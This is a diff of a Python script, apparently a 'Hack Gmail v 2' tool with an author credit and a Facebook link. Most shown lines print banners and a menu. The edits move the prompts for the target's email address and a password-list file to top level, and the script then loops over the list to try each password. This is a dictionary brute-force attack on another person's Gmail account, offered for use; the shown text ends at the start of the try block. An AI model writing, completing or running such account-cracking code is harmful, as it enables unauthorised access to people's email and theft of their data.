@@ -10,13 +10,18 @@ print("\033[1;91m  / / |__/ | |   / / | |   | |   |  _  /  | |   }  {        }  
 print("\033[1;91m / /       | |  / /  | |   | |   | | \ \  | |  / /\ \       | |_| |  / /\ \  ")
 print("\033[1;91m/_/        |_| /_/   |_|   |_|   |_|  \_\ |_| /_/  \_\      \_____/ /_/  \_\ ")
 print("\033[0;32m                    =========>> By Badrddin Mermouchi")
+print(" \033[0;91m       +========================================+ ")
+print("\033[0;32m        |..........Hack Gmail v 2...      .......| ")
+print("\033[0;91m        +----------------------------------------+ ")
+print("\033[0;32m        |#Badrddin mermouchi                     | ")
+print("\033[0;32m        |# Matrix                                | ")
+print("\033[0;32m        |#https://www.facebook.com/cori.justin.1/|  ")  
+print("\033[0;91m        +========================================+ ")
+print("\033[0;32m        |..........Gmail hack v 2.........       | ")
+print("\033[0;91m        +----------------------------------------+ ")
 print("\033[1;91m Facebook ==>> https://www.facebook.com/cori.justin.1/")
 print("                                                         ")
 print("\033[01;32m[01] \033[01;34mHack Gmail")
-def badr():
-    user = input("\033[01;33m[+] Email That you want to hack ===> :")
-    passwfile = input("\033[01;33m[+] 1\033[01;34mSelect a password list :")
-    passwfile = open(passwfile, "r")
 number = input("\033[01;32mTybe Your Number Please .... :")
 if number ==("1"):
    print("\033[1;91m        ,     , ")
@@ -28,7 +33,6 @@ if number ==("1"):
    print("\033[1;91m   / \______/ \/")
    print("\033[1;91m  /    /__\ ")
    print("\033[1;91m  (\   /____\ ")
-   badr()
 else:
     print("\033[01;33m===> Error The Number <===")
     print("\033[01;33m[*] \033[01;34mTybe Number '1' Please ....!")
@@ -36,13 +40,12 @@ else:
     if Number ==("1"):
         print("\033[01;33m .... \033[01;34mWillcom To My Programmer \033[01;33m 0....")
         
-        badr()
+        
     else:
         print("Error")
-def pidro():
-    user = input("\033[01;33m[+] Email That you want to hack ===> :")
-    passwfile = input("\033[01;33m[+] 1\033[01;34mSelect a password list :")
-    passwfile = open(passwfile, "r")
+user = input("\033[01;33m[+] Email That you want to hack ===> :")
+passwfile = input("\033[01;33m[+] 1\033[01;34mSelect a password list :")
+passwfile = open(passwfile, "r")
 
 for password in passwfile:
     try:
